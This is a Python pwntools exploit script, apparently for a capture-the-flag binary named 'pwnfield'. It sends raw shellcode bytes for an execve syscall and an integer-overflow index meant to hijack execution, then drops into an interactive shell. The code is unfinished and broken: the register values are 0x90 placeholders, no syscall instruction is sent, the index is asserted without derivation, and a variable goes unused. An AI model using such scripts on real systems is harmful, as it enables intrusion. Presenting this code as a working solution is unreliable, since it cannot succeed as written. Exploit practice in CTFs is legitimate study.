#!/usr/bin/env python3

from pwn import *

# Connect to the challenge
p = process('./pwnfield')  # or remote('host', port)

# Calculate overflow index
# We want to land at the start of our shellcode
target_offset = 0
index = 126322567  # Calculated value that should overflow to 0

# Prepare shellcode using mov instructions
# We'll use a technique where the mov instructions form valid shellcode
shellcode_instructions = [
    b'\xB8\x3B\x00\x00\x00',  # mov eax, 59 (execve syscall number)
    b'\xBF\x90\x90\x90\x90',  # mov edi, (we'll adjust this)
    b'\xBE\x90\x90\x90\x90',  # mov esi, (we'll adjust this)
    b'\xBA\x90\x90\x90\x90',  # mov edx, (we'll adjust this)
    # Add more instructions as needed
]

# Send shellcode
for instr in shellcode_instructions:
    p.sendafter(b'): ', instr)

# Send exit to stop input
p.sendafter(b'): ', b'exit\n')

# Send the overflow index
p.sendafter(b'? ', str(index).encode())

p.interactive()
